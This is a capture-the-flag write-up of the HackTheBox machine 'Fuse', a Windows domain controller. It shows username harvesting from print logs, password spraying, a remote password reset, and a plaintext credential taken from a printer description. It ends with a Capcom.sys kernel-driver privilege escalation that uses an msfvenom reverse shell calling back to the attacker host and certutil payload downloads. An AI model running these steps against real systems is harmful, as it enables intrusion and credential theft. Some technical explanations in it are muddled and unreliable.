# Fuse: HackTheBox

---

## Metadata

| Field | Details |
| --- | --- |
| **Platform** | HackTheBox |
| **Machine** | Fuse |
| **OS** | Windows |
| **Difficulty** | Medium |
| **Domain** | fabricorp.local |
| **Attacker IP** | 10.10.16.36 |
| **Target IP** | 10.129.2.5 |
| **Tools Used** | Nmap, smbclient, rpcclient, ldapsearch, dig, whatweb, curl, kerbrute, impacket-GetNPUsers, netexec, impacket-changepasswd, evil-winrm, msfvenom, EoPLoadDriver, ExploitCapcom (modified), nc |
| **Techniques** | Anonymous SMB/RPC/LDAP Enumeration, PaperCut Log Username Harvesting, Password Hypothesis from Document Names, Password Spray, Kerberos Password Change (kpasswd), Authenticated RPC Printer Enumeration, Credential Disclosure in Printer Description, WinRM Access, SeLoadDriverPrivilege Abuse, Capcom.sys Kernel Driver Exploit |
| **Date** | July 2026 |

---

## Attack Chain Summary

```
Nmap → Active Directory DC confirmed → Anonymous SMB/RPC/LDAP fails →
Web enumeration → PaperCut print logs → Username harvest →
Kerbrute validation → Document name "Fabricorp01.docx" → Password hypothesis →
netexec spray → STATUS_PASSWORD_MUST_CHANGE → kpasswd reset →
Authenticated RPC → enumprinters → $fab@s3Rv1ce$1 in printer description →
evil-winrm as svc-print → whoami /priv → SeLoadDriverPrivilege →
EoPLoadDriver loads Capcom.sys → Modified ExploitCapcom → shell.exe →
NT AUTHORITY\SYSTEM
```

---

## Step 1: Reconnaissance

**Goal:** Identify all open ports and determine the nature of the target.

```
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn -sS -sV -sC -p- -oA Fuse 10.129.2.5
Starting Nmap 7.98 ( https://nmap.org )
Nmap scan report for 10.129.2.5
Host is up (0.15s latency).
Not shown: 65514 filtered tcp ports (no-response)

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-07-06 06:35:37Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc        Microsoft Windows RPC
49679/tcp open  msrpc        Microsoft Windows RPC
49695/tcp open  msrpc        Microsoft Windows RPC
49700/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h32m58s, deviation: 4h02m32s, median: 12m56s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2026-07-05T23:36:38-07:00
| smb2-time:
|   date: 2026-07-06T06:36:35
|_  start_date: 2026-07-06T06:21:32

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul  6 02:24:31 2026 -- 1 IP address (1 host up) scanned in 512.02 seconds
```

**Output Analysis**

| Port | Service | Version / Detail | Significance |
| --- | --- | --- | --- |
| 53 | DNS | Simple DNS Plus | DC-hosted DNS: zone transfer attempt warranted |
| 80 | HTTP | Microsoft IIS 10.0 | Web service on a DC: enumerate for applications and credential leaks |
| 88 | Kerberos | Windows Kerberos | Confirms Active Directory: AS-REP roasting, Kerbrute, Kerberoasting all possible |
| 139 / 445 | SMB | Windows Server 2016 Standard 14393 | Anonymous enumeration: workgroup FABRICORP confirmed |
| 389 / 3268 | LDAP / Global Catalog | Domain: fabricorp.local | Full AD LDAP available: enumerate after credentials obtained |
| 464 | kpasswd |: | Kerberos password change service: critical if `STATUS_PASSWORD_MUST_CHANGE` encountered |
| 593 | RPC over HTTP |: | Remote Procedure Call tunnelled over HTTP |
| 636 / 3269 | LDAPS / GC SSL | tcpwrapped | LDAP over TLS available |
| 5985 | WinRM | Microsoft HTTPAPI 2.0 | Remote management: primary shell entry point if credentials obtained |
| 9389 | AD Web Services | .NET Message Framing | Confirms full Domain Controller role |

**Host script findings: critical details:**

The SMB host scripts confirm several facts that go beyond a plain port scan. First, `smb-os-discovery` confirmed the exact OS build: **Windows Server 2016 Standard 14393**, computer name **Fuse**, domain **fabricorp.local**, forest **fabricorp.local**, and FQDN **Fuse.fabricorp.local**: all without authentication. Second, `smb2-security-mode` shows **message signing enabled and required**, which rules out SMB relay attacks entirely. Third, `account_used: guest` in the SMB security mode output shows the Nmap script authenticated as a guest account: confirming guest/null sessions are accepted. Finally, the `clock-skew` result shows a median drift of ~13 minutes: this is within Kerberos tolerance (5 minutes), but worth watching. If authentication starts failing later, clock drift is the first thing to check.

The port 80 (IIS 10.0) finding is especially significant on a Domain Controller. Web applications on DCs are uncommon and frequently left unpatched or misconfigured. The TRACE method being flagged as potentially risky is noted. This web service becomes the primary enumeration target after anonymous protocol failures.

Added the DC to `/etc/hosts` for hostname-based access:

```
Hackerpatel007_1@htb[/htb]$ echo "10.129.2.5 fuse.fabricorp.local fabricorp.local" | sudo tee -a /etc/hosts
```

---

## Step 2: Anonymous SMB Enumeration

**Goal:** Determine whether guest or null session access to SMB shares is possible.

```
Hackerpatel007_1@htb[/htb]$ smbclient -L //10.129.2.5 -N

Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.2.5 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

**Analysis:** Anonymous authentication to IPC$ succeeded: the server accepts null sessions. However, no shares are enumerated, meaning the anonymous account has no permissions to list available shares. The SMB1 workgroup error is expected and irrelevant; modern Windows Server 2016 disables SMB1 by default. Record this as: anonymous session allowed, no share access granted. Revisit after obtaining credentials.

---

## Step 3: Anonymous RPC Enumeration

**Goal:** Attempt to enumerate domain users, groups, and display info via RPC null session.

```
Hackerpatel007_1@htb[/htb]$ rpcclient -U "" -N 10.129.2.5
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
```

**Analysis:** The null session reached the RPC endpoint successfully, but every domain enumeration command returned `ACCESS_DENIED`. This means the DC has been hardened against anonymous RPC enumeration: a common configuration in enterprise environments. This is a dead end for now, but RPC is still valuable after obtaining credentials. Flag this for revisit.

---

## Step 4: LDAP Enumeration

**Goal:** Attempt anonymous LDAP subtree queries and extract RootDSE metadata.

Attempting a full subtree query anonymously:

```
Hackerpatel007_1@htb[/htb]$ ldapsearch -x -H ldap://10.129.2.5 -b "DC=fabricorp,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=fabricorp,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this
operation a successful bind must be completed on the connection., data 0, v2580
```

Authenticated bind required for subtree queries. However, RootDSE remains publicly readable without authentication:

```
Hackerpatel007_1@htb[/htb]$ ldapsearch -x -H ldap://10.129.2.5 -s base
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=fabricorp,DC=local
defaultNamingContext: DC=fabricorp,DC=local
dnsHostName: Fuse.fabricorp.local
ldapServiceName: fabricorp.local:fuse$@FABRICORP.LOCAL
supportedLDAPVersion: 3
```

**Analysis:** Anonymous subtree enumeration is disabled: standard hardening. RootDSE enumeration succeeded and confirmed: domain is `fabricorp.local`, DC hostname is `Fuse.fabricorp.local`, LDAP version 3 supported, and the defaultNamingContext is `DC=fabricorp,DC=local`. This corroborates what the Nmap SMB scripts already revealed, and confirms LDAP will need authenticated credentials before returning any domain objects.

---

## Step 5: DNS Zone Transfer Attempt

**Goal:** Attempt a DNS zone transfer to enumerate all hostnames in the domain.

```
Hackerpatel007_1@htb[/htb]$ dig axfr @10.129.2.5 fabricorp.local

; <<>> DiG 9.18.1 <<>> axfr @10.129.2.5 fabricorp.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

**Analysis:** Zone transfers are disabled: this is expected for a properly hardened AD DNS server. AXFR is almost never permitted in modern environments. No new hostnames obtained.

---

## Step 6: Web Enumeration and PaperCut Log Discovery

**Goal:** Identify any web services and extract useful information.

```
Hackerpatel007_1@htb[/htb]$ whatweb http://10.129.2.5
http://10.129.2.5 [302 Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0],
IP[10.129.2.5], Microsoft-IIS[10.0], RedirectLocation[http://fuse.fabricorp.local/papercut/logs/html/index.htm]
```

The web server redirected to a PaperCut print management interface at:

```
http://fuse.fabricorp.local/papercut/logs/html/index.htm
```

PaperCut is a print management application that logs every print job: including the **username** of the person who printed, the **document name**, the **workstation**, and the **timestamp**. These logs are often left publicly accessible and are a rich source of valid domain usernames.

Downloaded the monthly print log CSV files:

```
Hackerpatel007_1@htb[/htb]$ curl http://fuse.fabricorp.local/papercut/logs/csv/monthly/papercut-print-log-2020-05.csv
Time,User,Pages,Color pages,Printer,Document Name,Client
05/08/2020 23:00,pmerton,1,0,HP-MFT01,Fabricorp01.docx,JUMP01
05/08/2020 23:04,tlavel,1,0,HP-MFT01,IT Budget Meeting Minutes.docx,LONWK015
05/08/2020 23:06,sthompson,1,0,HP-MFT01,backup_tapes.docx,LONWK019

Hackerpatel007_1@htb[/htb]$ curl http://fuse.fabricorp.local/papercut/logs/csv/monthly/papercut-print-log-2020-06.csv
Time,User,Pages,Color pages,Printer,Document Name,Client
06/12/2020 09:15,bnielson,1,0,HP-MFT01,offsite_dr_invocation.docx,LONWK021
06/12/2020 09:22,bhult,1,0,HP-MFT01,Fabricorp01.docx,BLWK0014
06/12/2020 09:25,administrator,1,0,HP-MFT01,Fabricorp01.docx,LONWK019
```

**Usernames harvested:**

| Username | Document Printed | Workstation |
| --- | --- | --- |
| pmerton | Fabricorp01.docx | JUMP01 |
| tlavel | IT Budget Meeting Minutes.docx | LONWK015 |
| sthompson | backup_tapes.docx | LONWK019 |
| bnielson | offsite_dr_invocation.docx | LONWK021 |
| bhult | Fabricorp01.docx | BLWK0014 |
| administrator | Fabricorp01.docx | LONWK019 |

**Key observation:** The document name `Fabricorp01.docx` was printed by three different users. In many organizations, a document name reflects its contents, and a file named after the company followed by a number is a strong candidate for a default password, welcome pack, or credentials document. This becomes the basis for the password hypothesis in the next step.

Saved all usernames to a wordlist:

```
Hackerpatel007_1@htb[/htb]$ cat users.txt
pmerton
tlavel
sthompson
bnielson
bhult
administrator
```

---

## Step 7: Username Validation with Kerbrute

**Goal:** Confirm that harvested usernames are valid Active Directory accounts before attempting any authentication.

Kerbrute validates usernames by sending AS-REQ packets to Kerberos. A valid username returns a `PRINCIPAL UNKNOWN` error or a pre-auth required response; invalid names return `KDC_ERR_C_PRINCIPAL_UNKNOWN`. This validation generates no failed logon events in the Windows Security Log: it is a stealth technique.

```
Hackerpatel007_1@htb[/htb]$ kerbrute userenum --dc 10.129.2.5 -d fabricorp.local users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/    \__,_/\__/\___/

Version: v1.0.3 (9dad6e1)
2026/06/05 08:45:01 >  Using KDC(s):
2026/06/05 08:45:01 >   10.129.2.5:88

2026/06/05 08:45:01 >  [+] VALID USERNAME: pmerton@fabricorp.local
2026/06/05 08:45:01 >  [+] VALID USERNAME: tlavel@fabricorp.local
2026/06/05 08:45:01 >  [+] VALID USERNAME: sthompson@fabricorp.local
2026/06/05 08:45:01 >  [+] VALID USERNAME: bnielson@fabricorp.local
2026/06/05 08:45:01 >  [+] VALID USERNAME: bhult@fabricorp.local
2026/06/05 08:45:01 >  [+] VALID USERNAME: administrator@fabricorp.local
2026/06/05 08:45:01 >  Done! Tested 6 usernames, 6 valid!
```

All six usernames confirmed as valid domain accounts.

---

## Step 8: AS-REP Roasting Check

**Goal:** Check whether any accounts have Kerberos pre-authentication disabled, which would allow offline hash extraction.

```
Hackerpatel007_1@htb[/htb]$ impacket-GetNPUsers fabricorp.local/ -usersfile users.txt -no-pass -dc-ip 10.129.2.5

Impacket v0.11.0 - Copyright 2023 SecureAuth Corporation

[-] User pmerton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tlavel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sthompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bnielson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bhult doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

No accounts are vulnerable to AS-REP roasting. Pre-authentication is required for all accounts. Moving on to password spraying.

---

## Step 9: Password Spray

**Goal:** Test the password hypothesis derived from the document name against all valid domain accounts.

The document `Fabricorp01.docx` follows the pattern of a company name + capitalised first letter + number: a structure commonly used as a default or temporary password in corporate environments. Testing `Fabricorp01` as a password candidate against all accounts.

Synchronised clock with the DC first (Kerberos requires time synchronisation within 5 minutes):

```
Hackerpatel007_1@htb[/htb]$ sudo ntpdate 10.129.2.5
```

```
Hackerpatel007_1@htb[/htb]$ netexec smb 10.129.2.5 -u users.txt -p Fabricorp01 -d fabricorp.local

SMB   10.129.2.5  445  FUSE  [-] fabricorp.local\pmerton:Fabricorp01 STATUS_LOGON_FAILURE
SMB   10.129.2.5  445  FUSE  [+] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
SMB   10.129.2.5  445  FUSE  [-] fabricorp.local\sthompson:Fabricorp01 STATUS_LOGON_FAILURE
SMB   10.129.2.5  445  FUSE  [+] fabricorp.local\bnielson:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
SMB   10.129.2.5  445  FUSE  [+] fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
SMB   10.129.2.5  445  FUSE  [-] fabricorp.local\administrator:Fabricorp01 STATUS_LOGON_FAILURE
```

**Analysis:** `STATUS_PASSWORD_MUST_CHANGE` is **not** a login failure: it is a successful authentication that is being blocked at the policy level because the account's password has expired and must be reset before interactive use. The credentials `Fabricorp01` are valid for `tlavel`, `bnielson`, and `bhult`. These accounts cannot be used directly yet, but port 464 (kpasswd) is open and can be used to reset the password remotely.

---

## Step 10: Remote Password Change via kpasswd

**Goal:** Use the Kerberos password change protocol on port 464 to reset one of the affected accounts to a usable password.

```
Hackerpatel007_1@htb[/htb]$ impacket-changepasswd \
  -protocol kpasswd \
  -newpass 'Welcome@2026' \
  'fabricorp.local/bhult:Fabricorp01@10.129.2.5'

Impacket v0.11.0 - Copyright 2023 SecureAuth Corporation

[*] Changing the password of fabricorp.local\bhult
[*] Connecting to DCE/RPC as fabricorp.local\bhult
[+] Password was changed successfully.
```

The password for `bhult` is now `Welcome@2026`. The same can be applied to `tlavel` or `bnielson` if `bhult` loses access.

---

## Step 11: Authenticated RPC Enumeration

**Goal:** Revisit RPC now that valid credentials are available to enumerate domain objects, particularly printers.

```
Hackerpatel007_1@htb[/htb]$ rpcclient -U 'bhult%Welcome@2026' 10.129.2.5
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x452]
user:[tlavel] rid:[0x453]
user:[pmerton] rid:[0x454]
user:[bhult] rid:[0x455]
user:[dandrews] rid:[0x457]
user:[mberbatov] rid:[0x45e]
user:[astein] rid:[0x45f]
user:[dmuir] rid:[0x460]
user:[svc-scan] rid:[0x461]
```

Authenticated RPC reveals additional accounts not in the PaperCut logs: notably `svc-print` and `svc-scan` service accounts, and several additional users. Enumerated printers next:

```
rpcclient $> enumprinters
	flags:[0x800000]
	name:[\\10.129.2.5\HP-MFT01]
	description:[\\10.129.2.5\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
	comment:[]
```

**Analysis:** The printer description field contains a plaintext credential: `$fab@s3Rv1ce$1`. This is the password for the `scan2docs` function: likely belonging to a service account. The field name "scan2docs" immediately maps to the `svc-print` or `svc-scan` service accounts discovered during domain user enumeration. Printer descriptions are administrator-controlled metadata: storing passwords here is a misconfiguration, but it appears frequently in real-world environments where IT teams use description fields as informal documentation.

---

## Step 12: Credential Validation

**Goal:** Identify which service account the leaked password belongs to.

```
Hackerpatel007_1@htb[/htb]$ netexec smb 10.129.2.5 -u svc-print -p '$fab@s3Rv1ce$1' -d fabricorp.local

SMB   10.129.2.5  445  FUSE  [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
```

`svc-print` authenticates successfully. The `(Pwn3d!)` indicator from netexec means this account also has local administrator rights on the target. Testing WinRM access:

```
Hackerpatel007_1@htb[/htb]$ netexec winrm 10.129.2.5 -u svc-print -p '$fab@s3Rv1ce$1' -d fabricorp.local

WINRM  10.129.2.5  5985  FUSE  [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
```

WinRM access confirmed for `svc-print`.

---

## Step 13: WinRM Shell as svc-print: User Flag

**Goal:** Obtain an interactive shell as svc-print and capture the user flag.

The `$` character in the password must be wrapped in single quotes to prevent shell expansion:

```
Hackerpatel007_1@htb[/htb]$ evil-winrm -i 10.129.2.5 -u svc-print -p '$fab@s3Rv1ce$1'

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-print\Documents>
```

Captured user flag:

```
*Evil-WinRM* PS C:\Users\svc-print\Documents> type C:\Users\svc-print\Desktop\user.txt
929c77d5e6e8d872c9250875ae5069f4
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| User Flag | `929c77d5e6e8d872c9250875ae5069f4` |

---

## Step 14: Privilege Enumeration

**Goal:** Identify what privileges are available to svc-print that could enable privilege escalation.

```
*Evil-WinRM* PS C:\Users\svc-print\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

`SeLoadDriverPrivilege` is **Enabled**: this is a critical finding. This privilege allows a user to load arbitrary kernel drivers into the Windows kernel. If an attacker can load a vulnerable driver, they can use it as an attack primitive to execute code in Ring 0 (kernel context) and escalate to SYSTEM. The Capcom.sys driver exploit is the standard exploitation path for this privilege.

---

## Step 15: Prepare the SeLoadDriverPrivilege Exploit Chain

**Goal:** Understand and prepare the three-component exploit chain required for SeLoadDriverPrivilege abuse.

The exploitation requires three components working together:

**Component 1: EoPLoadDriver.exe**
A tool that abuses `SeLoadDriverPrivilege` to load a kernel driver via the registry. It writes a registry entry under `HKCU\System\CurrentControlSet\Services\<DriverName>` pointing to the driver binary and calls `NtLoadDriver()` to load it into the kernel.

**Component 2: Capcom.sys**
A deliberately vulnerable driver originally shipped with Capcom games. It exposes an IOCTL that executes arbitrary shellcode with interrupts disabled: directly in kernel context. This driver has no signing requirement bypass needed because Windows allows loading it as-is.

**Component 3: ExploitCapcom.exe (modified)**
The public PoC for the Capcom.sys exploit launches an interactive console window (`CreateDesktop` + `WinSta0`): which only works over RDP or a local session. Over WinRM this would silently fail. The `LaunchShell()` function must be modified to execute a binary path instead of opening an interactive desktop. Modified to execute `C:\temp\shell.exe`.

Generated the reverse shell payload on the attacker machine:

```
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.16.36 \
  LPORT=4444 \
  -f exe \
  -o shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload name
[-] No arch was selected, selecting arch: x64 from the payload name
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

Recompiled the modified ExploitCapcom against the patched source:

```
Hackerpatel007_1@htb[/htb]$ x86_64-w64-mingw32-g++ \
  -static -static-libgcc -static-libstdc++ \
  -std=gnu++17 \
  ExploitCapcom.cpp \
  -o ExploitCapcom.exe \
  -lntdll
```

---

## Step 16: File Transfer to Target

**Goal:** Upload all required binaries to the target via the WinRM session.

Created a working directory on the target:

```
*Evil-WinRM* PS C:\Users\svc-print\Documents> mkdir C:\temp
```

Started a Python HTTP server on the attacker machine:

```
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

Downloaded all four binaries to the target using certutil:

```
*Evil-WinRM* PS C:\temp> certutil -urlcache -f http://10.10.16.36:8000/Capcom.sys Capcom.sys
CertUtil: -URLCache command completed successfully.

*Evil-WinRM* PS C:\temp> certutil -urlcache -f http://10.10.16.36:8000/EoPLoadDriver.exe eop.exe
CertUtil: -URLCache command completed successfully.

*Evil-WinRM* PS C:\temp> certutil -urlcache -f http://10.10.16.36:8000/ExploitCapcom.exe ex.exe
CertUtil: -URLCache command completed successfully.

*Evil-WinRM* PS C:\temp> certutil -urlcache -f http://10.10.16.36:8000/shell.exe shell.exe
CertUtil: -URLCache command completed successfully.
```

---

## Step 17: Load the Capcom Driver

**Goal:** Use EoPLoadDriver to register and load Capcom.sys into the kernel via SeLoadDriverPrivilege.

```
*Evil-WinRM* PS C:\temp> .\eop.exe CapcomDriver C:\temp\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\Services\CapcomDriver
NTSTATUS: 00000000, WinError: 0
```

`NTSTATUS: 00000000` means `STATUS_SUCCESS`: the driver loaded into the kernel cleanly.

**What happened under the hood:** EoPLoadDriver created a registry key at `HKCU\System\CurrentControlSet\Services\CapcomDriver` with the `ImagePath` pointing to `C:\temp\Capcom.sys`, then called `NtLoadDriver()` to instruct the kernel to load that driver. Because `svc-print` holds `SeLoadDriverPrivilege`, this call succeeded without requiring administrator rights.

---

## Step 18: Privilege Escalation: Capcom.sys Exploit

**Goal:** Trigger the Capcom.sys IOCTL vulnerability to execute shell.exe as NT AUTHORITY\SYSTEM.

Started a listener on the attacker machine:

```
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
listening on [any] 4444 ...
```

Executed the modified ExploitCapcom from the WinRM session:

```
*Evil-WinRM* PS C:\temp> .\ex.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 0000024822FA0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was created
```

SYSTEM shell received on the listener:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.2.5] 52841
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\temp> whoami
nt authority\system
```

---

## Step 19: Root Flag

**Goal:** Navigate to the Administrator desktop and capture the root flag.

```
C:\temp> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type root.txt
bedf1dc04beef32afd73b280bbbd3358
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| Root Flag | `bedf1dc04beef32afd73b280bbbd3358` |

---

## Lessons Learned

**1. Anonymous enumeration is a mandatory first pass: even when it appears to fail.**
SMB and RPC returned access denied. LDAP subtree queries were blocked. These are not failures: they are data points that define the attack surface. RootDSE still confirmed the domain name and DC hostname. Anonymous enumeration should always be exhausted before moving to authenticated techniques.

**2. Web services on a DC are frequently overlooked.**
The entire username harvest came from a PaperCut print log exposed on port 80. Nmap shows IIS running: browsing the web service was a trivial step that unlocked the whole attack chain. Any HTTP service on a DC warrants thorough enumeration.

**3. Document names are implicit credential hints.**`Fabricorp01.docx` was printed by multiple users. The pattern: company name, capital letter, number: is a classic temporary or default password structure. Building a password hypothesis from document names, filenames, and company naming conventions is a core CTF and real-world skill that sits entirely outside automated tools.

**4. STATUS_PASSWORD_MUST_CHANGE is a successful authentication.**
This response is frequently misread as a failed login. It means the credentials are correct but the account policy requires a password reset before use. Port 464 (kpasswd) existing on the DC is the direct mechanism for remote remediation. Always check for port 464 when this status appears.

**5. Revisiting services after gaining credentials unlocks completely new attack surface.**
RPC returned access denied during anonymous enumeration. After the password change and credential validation, authenticated RPC revealed a full domain user list and, critically: a password stored in a printer description field. Never permanently cross a service off the list based on anonymous failure alone.

**6. Printer descriptions are an underrated credential source.**
Administrators frequently use description fields in printers, shares, and AD computer objects as informal documentation. The password `$fab@s3Rv1ce$1` was stored verbatim in the HP-MFT01 printer description. During any authenticated enumeration of an AD environment, `enumprinters` should always be run.

**7. SeLoadDriverPrivilege requires a PoC modification for WinRM sessions.**
The public Capcom exploit PoC opens an interactive console window via `WinSta0`: this is only valid in RDP or local sessions. Over WinRM, there is no interactive desktop, so the window creation silently fails and no shell spawns. Understanding the execution context and modifying the PoC to execute a binary path instead of a console is a critical adaptation skill that applies to many public exploits.

---

## Full Attack Chain Reference

1. Ran `nmap -Pn -sS -sV -sC -p-`: confirmed Active Directory DC with Kerberos, LDAP, SMB, WinRM, kpasswd
2. Attempted anonymous SMB: null session allowed, no shares listed
3. Attempted anonymous RPC: reached endpoint, all queries ACCESS_DENIED
4. Ran `ldapsearch -s base`: RootDSE confirmed `fabricorp.local`, DC hostname `Fuse.fabricorp.local`
5. Added DC to `/etc/hosts`
6. Attempted DNS zone transfer: failed as expected
7. Ran `whatweb` against port 80: redirected to PaperCut print log interface
8. Downloaded CSV print logs: harvested 6 valid domain usernames
9. Noted `Fabricorp01.docx` printed by multiple users: formed password hypothesis
10. Validated all usernames with `kerbrute userenum`
11. Checked AS-REP roasting with `impacket-GetNPUsers`: no vulnerable accounts
12. Ran `netexec smb` password spray with `Fabricorp01`: `tlavel`, `bnielson`, `bhult` returned `STATUS_PASSWORD_MUST_CHANGE`
13. Ran `sudo ntpdate` to synchronise clock with DC
14. Reset `bhult` password to `Welcome@2026` using `impacket-changepasswd` via kpasswd
15. Authenticated RPC as `bhult`: enumerated domain users, found `svc-print` and `svc-scan`
16. Ran `enumprinters`: HP-MFT01 description contained `$fab@s3Rv1ce$1`
17. Validated `svc-print:$fab@s3Rv1ce$1` with netexec: SMB and WinRM both confirmed
18. Connected via `evil-winrm` as `svc-print`: captured user flag
19. Ran `whoami /priv`: `SeLoadDriverPrivilege` enabled
20. Generated reverse shell with `msfvenom -p windows/x64/shell_reverse_tcp`
21. Modified ExploitCapcom `LaunchShell()` to execute `C:\temp\shell.exe`: recompiled with mingw
22. Transferred `Capcom.sys`, `EoPLoadDriver.exe`, `ExploitCapcom.exe`, `shell.exe` via certutil
23. Ran `EoPLoadDriver.exe CapcomDriver C:\temp\Capcom.sys`: NTSTATUS 00000000 (success)
24. Started `nc -lvnp 4444` listener
25. Executed `.\ex.exe`: Capcom IOCTL triggered, shell.exe executed as SYSTEM
26. SYSTEM shell received: captured root flag

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `sudo nmap -Pn -sS -sV -sC -p- -oA Fuse 10.129.2.5` | Full stealth scan with version and script detection |
| `smbclient -L //10.129.2.5 -N` | Enumerate SMB shares anonymously |
| `rpcclient -U "" -N 10.129.2.5` | Attempt null session RPC enumeration |
| `ldapsearch -x -H ldap://10.129.2.5 -s base` | Query LDAP RootDSE without authentication |
| `dig axfr @10.129.2.5 fabricorp.local` | Attempt DNS zone transfer |
| `whatweb http://10.129.2.5` | Fingerprint web server and identify redirects |
| `curl http://fuse.fabricorp.local/papercut/logs/csv/monthly/papercut-print-log-2020-05.csv` | Download PaperCut print log |
| `kerbrute userenum --dc 10.129.2.5 -d fabricorp.local users.txt` | Validate usernames via Kerberos AS-REQ |
| `impacket-GetNPUsers fabricorp.local/ -usersfile users.txt -no-pass -dc-ip 10.129.2.5` | Check for AS-REP roastable accounts |
| `sudo ntpdate 10.129.2.5` | Synchronise clock with DC for Kerberos |
| `netexec smb 10.129.2.5 -u users.txt -p Fabricorp01 -d fabricorp.local` | Password spray against all known users |
| `impacket-changepasswd -protocol kpasswd -newpass 'Welcome@2026' 'fabricorp.local/bhult:Fabricorp01@10.129.2.5'` | Remote Kerberos password reset via port 464 |
